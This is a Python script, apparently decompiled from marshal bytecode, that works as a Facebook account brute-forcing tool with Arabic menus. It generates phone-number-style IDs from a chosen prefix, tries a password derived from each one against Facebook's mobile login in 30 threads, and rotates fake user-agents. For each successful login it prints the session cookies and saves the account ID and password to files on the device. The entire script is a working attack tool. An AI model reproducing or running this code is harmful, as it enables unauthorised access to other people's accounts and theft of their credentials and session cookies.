# Decoded by marshal-magic
#Negan 
import uuid
import base64
import platform
import string
import re
import random
import json
import time
import sys
from bs4 import BeautifulSoup
import marshal
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
import os
os.system('https://www.facebook.com/profile.php?id=100034944630676&mibextid=ZbWKwL')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install requests pip , install futures , pip install rich')
    os.system('python USMAN.py')
    os.system("xdg-open https://www.facebook.com/profile.php?id=100034944630676&mibextid=ZbWKwL")
ugen = []
A = '\x1b[1;97m'
B = '\x1b[1;96m'
C = '\x1b[1;91m'
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'
E = '\x1b[1;93m'
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
KB = '{ KB }'
for xd in range(10000):
    a = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                      'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                      'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
try:
    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
except:
    pass
sock = open('ua.html', 'r').read().splitlines()


def uaku():
    try:
        ua = open('bbnew.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://bacho1001.blogspot.com/2023/07/ua.html').text
        ua = open('.user-agents.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un+'\n')
        ua = open('.user-agents.txt', 'r').read().splitlines()


loop = 0
cps = []
oks = []
twf = []


def clear():
    os.system('clear')
    print(logo)


logo = """
\033[1;91m   
│ ███╗   ██╗███████╗ ██████╗  █████╗ ███╗   ██╗           │
│ ████╗  ██║██╔════╝██╔════╝ ██╔══██╗████╗  ██║           │
│ ██╔██╗ ██║█████╗  ██║  ███╗███████║██╔██╗ ██║           │
│ ██║╚██╗██║██╔══╝  ██║   ██║██╔══██║██║╚██╗██║           │
│ ██║ ╚████║███████╗╚██████╔╝██║  ██║██║ ╚████║           │
│ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝           │
\033[1;91m    
\033[1;32m      
\033[1;35m      
\033[1;34m      

 ﻞﺻﺍﻮﺗ: 0916078###
   ﻙﻮﺒﺴﻴﻓ : M. O. Lamlom
 ﺕﺍﺩﺍ ﺖﻳﺪﺤﺗ:2.0.7          
\033[1;91m=============================================VIP============="""


def linex():
    print(
        f'\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')


def checks(oks, cps, twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()


loop = 0
cps = []
oks = []
twf = []


def cek_apk(session, coki):
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",
                    cookies={"cookie": coki}).text
    sop = BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game) == 0:
        print(
            f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS Ã°Å¸Å½Â®%s  ' % (ORANGE))
    else:
        print(
            f'\r {GREEN}[Ã¢Ë†Å¡] %sYOUR ACTIVE APPLICATION DETAILS :' % (GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s " % (
                N, i+1, game[i]. replace("Ditambahkan pada", " Ditambahkan pada"), N))
        # else:
            # print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",
                    cookies={"cookie": coki}).text
    sop = BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game) == 0:
        print(
            f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS Ã°Å¸Å½Â®%s' % (ORANGE))
    else:
        print(f'\r Ã°Å¸Å½Â®  %{RED}sYOUR EXPIRED APKS DETAILS :' % (RED))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s " % (
                N, i+1, game[i]. replace("Kedaluwarsa", " Kedaluwarsa"), N))
            print(f"{GREEN}●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●")
    # ____________#


def xyz():
    os.system("play-audio WELCOME_TO_DAMAR_BOOT_818.mp3")
    os.getuid
    os.system("clear")
    print(logo)
    print('           \x1b[97m[\033[37;41m  𝐌𝐀𝐑𝐖𝐀𝐍   \033[0;m] ')
    print(f"")
    print(f"{BLUE}[01] {GREEN} ﺍﺪﺟ ﻊﻳﺮﺳ  ﻲﺋﺍﻮﺸﻋ ﺺﺤﻓ")
    print(f"{BLUE}[00] {GREEN}  ﺓﺍﺩﻻﺍ ﻦﻣ ﺝﻭﺮﺨﻟﺍ")
    print(f"")
    print(f"\033[1;91m========================================================")
    LUQMAN = input("[√] ﺭﺎﺘﺧﺍ : ")
    if LUQMAN in ["1", "01"]:
        Tabii()
    elif LUQMAN in ["0", "00"]:
        exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()

# _____________#

# _____________________#


def Tabii():
    user = []
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  𝐌𝐀𝐑𝐖𝐀𝐍  𝐌𝐀𝐍𝐎𝐆𝐈 \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print('ﻪﺒﺤﺗ ﺩﻮﻛ ﻱﺍ ﻭﺍ ﻚﺘﻟﻭﺩ ﺩﻮﻛ ﺭﺎﺘﺧﺍ ')
    print(f"")
    linex()
    code = input('  ﻩﺪﻳﺮﺗ ﻱﺬﻟﺍ ﺩﻮﻜﻟﺍ ﻞﺧﺩﺍ: ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  ﺮﺘﺧﺍ ﺩﺪﻋ   ﺺﺤﻔﻟﺍ \033[0;m]")
    print(f"")
    limit = int(input('ﻝﺎﺜﻣ : 1000, 2000, 5000, 10000\n\nﺏﻮﻠﻄﻤﻟﺍ ﺩﺪﻌﻟﺍ ﻞﺧﺩﺍ : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        clear()
        tl = str(len(user))
        print(f" {BLUE}ﺕﺎﻳﺪﻳﻻﺍ ﻲﻟﺎﻤﺟﺍ: {GREEN}"+tl)
        print(f" {BLUE}اﺓﺍﺩﻻﺍ ﻪﻨﻣ ﺖﺟﺮﺧ ﻱﺬﻟﺍ ﺪﻠﺒﻟ: {GREEN}libya ")
        print(f" {BLUE}ﻪﺗﺮﺘﺧﺍ ﻱﺬﻟﺍ ﺩﻮﻜﻟﺍ{GREEN}"+code)
        print(f" {BLUE}ﺮﻈﺘﻧﺍ ﺺﺤﻔﻟﺍ ﺀﺪﺑ ﺪﻘﻟ ثانية")
        print(f'{GREEN}===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free, uid, pwx, tl)


def free(uid, pwx, tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In"}
            header_freefb = {'authority': 'm.facebook.com',
                             'method': 'POST',
                             'scheme': 'https',
                             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                             'accept-encoding': 'utf-8', 'accept-language': 'en-US,en;q=0.9',
                             'cache-control': 'max-age=0',
                             'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                             'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
                             'sec-fetch-dest': 'document',
                             'sec-fetch-mode': 'navigate',
                             'sec-fetch-site': 'none',
                             'sec-fetch-user': '?1',
                             'upgrade-insecure-requests': '1',
                             'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',
                              data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join(
                    [key+"="+value for key, value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[NEGAN-OK]--------------------[√]\nالرقم : '+uid+'\nالايدي   : ' +
                      cid+' √ '+ps + '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session, coki)
                open('/sdcard/DAMAR-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki = ";".join(
                    [key+"="+value for key, value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[NEGAN-OK]---------------------[×]\nﻢﻗﺮﻟﺍ : '+uid +
                      '\nﻱﺪﻳﻻﺍ   : '+cid+' √ '+ps + '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/𝐌𝐀𝐑𝐖𝐀𝐍-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki = ";".join(
                    [key+"="+value for key, value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/DAMAR-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop += 1
        sys.stdout.write(f'\r\33[1;37m[DAMAR ] [%s]\33[1;97m [OK:%s~CP:%s]' % (
            loop, len(oks), len(cps))),
        sys.stdout.flush()
        checks(oks, cps, twf)
    except:
        pass


if __name__ == '__main__':
    xyz()
